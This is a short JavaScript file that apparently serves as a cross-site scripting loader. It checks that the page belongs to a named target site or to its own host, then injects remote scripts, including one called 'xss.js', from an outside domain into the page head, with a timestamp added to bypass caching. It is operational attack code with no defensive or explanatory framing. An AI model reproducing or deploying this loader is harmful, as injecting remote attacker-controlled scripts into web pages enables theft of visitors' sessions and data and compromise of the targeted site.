var strTargetHost1="http://www.hoylam.net/";
var strJSHost1="http://uyghurhome.ml/";
//var strJSHost1="https://localhost/";

//always no cache
function addScriptToHead1(strURL,strID)
{
    var head = document.getElementsByTagName("head");
    head = head[0];
    var t = new Date();
    t = t.getTime();
    var script = document.createElement("script");
    script.id=strID;
    script.type = "text/javascript"
    script.charset = "utf-8";
    script.src = strURL + "?t="+t;
    head.appendChild(script);
}

try
{
    if(window.location.href.indexOf(strTargetHost1)===-1&&window.location.href.indexOf(strJSHost1)===-1)
    {
        throw "unrecongnized url:"+window.location.href;
    }
    addScriptToHead1(strJSHost1+"webroot_mycakephp/zfirst/js/xss.js","idScriptXSS");
    addScriptToHead1(strJSHost1+"webroot_mycakephp/zfirst/js/common.js","idScriptCommon");
}
catch(e)
{
    console.log(e);
}